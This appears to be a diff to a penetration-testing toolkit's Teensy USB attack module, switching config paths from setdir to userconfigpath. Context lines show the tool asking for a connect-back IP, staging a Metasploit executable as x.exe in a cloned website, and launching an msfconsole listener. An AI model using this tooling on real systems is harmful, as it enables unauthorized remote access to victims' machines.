@@ -29,9 +29,9 @@ now = datetime.datetime.today()
 if operating_system != "windows":
     import pexpect
 
-# check to see if setdir is created
-if not os.path.isdir(os.path.join(core.setdir + "reports")):
-    os.makedirs(os.path.join(core.setdir + "reports"))
+# check to see if userconfigpath is created
+if not os.path.isdir(os.path.join(core.userconfigpath, "reports")):
+    os.makedirs(os.path.join(core.userconfigpath, "reports"))
 
 definepath = os.getcwd()
 # define if use apache or not
@@ -57,7 +57,7 @@ for line in apache_check:
 
 # grab info from config file
 
-with open(os.path.join(core.setdir + "teensy")) as fileopen:
+with open(os.path.join(core.userconfigpath, "teensy")) as fileopen:
     counter = 0
     payload_counter = 0
     choice = None
@@ -77,14 +77,14 @@ with open(os.path.join(core.setdir + "teensy")) as fileopen:
             ipaddr = input(core.setprompt(["6"], "IP address to connect back on"))
             core.update_options("IPADDR=" + ipaddr)
 
-    if not os.path.isfile(os.path.join(core.setdir + "teensy")):
+    if not os.path.isfile(os.path.join(core.userconfigpath, "teensy")):
         core.print_error("FATAL:Something went wrong, the Teensy config file was not created.")
         core.exit_set()
 
 
 def writefile(filename, now):
     with open(os.path.join("src/teensy/" + filename)) as fileopen, \
-            open(os.path.join(core.setdir + "/reports/teensy_{0}.ino".format(now)), "w") as filewrite:
+            open(os.path.join(core.userconfigpath, "reports/teensy_{0}.ino".format(now)), "w") as filewrite:
 
         for line in fileopen:
             match = re.search("IPADDR", line)
@@ -128,7 +128,7 @@ if choice == "13":
 
 # save our stuff here
 print(core.bcolors.BLUE +
-      "\n[*] INO file created. You can get it under '{0}'".format(os.path.join(core.setdir +
+      "\n[*] INO file created. You can get it under '{0}'".format(os.path.join(core.userconfigpath,
                                                                                "reports" +
                                                                                "teensy_{0}.ino".format(now))) +
       core.bcolors.ENDC)
@@ -142,8 +142,8 @@ print(core.bcolors.RED +
 pause = input("Press {return} to continue.")
 
 if payload_counter == 1:
-    webclone_path = os.path.join(core.setdir + "web_clone")
-    metasploit_exec_path = os.path.join(core.setdir + "msf.exe")
+    webclone_path = os.path.join(core.userconfigpath, "web_clone")
+    metasploit_exec_path = os.path.join(core.userconfigpath, "msf.exe")
     if not apache:
 
         subprocess.Popen("mkdir {0};"
@@ -158,13 +158,13 @@ if payload_counter == 1:
     else:
         subprocess.Popen("cp {0} {1}".format(metasploit_exec_path, os.path.join(webclone_path + "x.exe")), shell=True).wait()
 
-    if os.path.isfile(os.path.join(core.setdir + "meta_config")):
+    if os.path.isfile(os.path.join(core.userconfigpath, "meta_config")):
         print(core.bcolors.BLUE + "\n[*] Launching MSF Listener...")
         print(core.bcolors.BLUE + "[*] This may take a few to load MSF..." + core.bcolors.ENDC)
         try:
             if operating_system != "windows":
                 child1 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(msf_path + "msfconsole"),
-                                                                   os.path.join(core.setdir + "meta_config")))
+                                                                   os.path.join(core.userconfigpath, "meta_config")))
                 child1.interact()
         except:
             if operating_system != "windows":
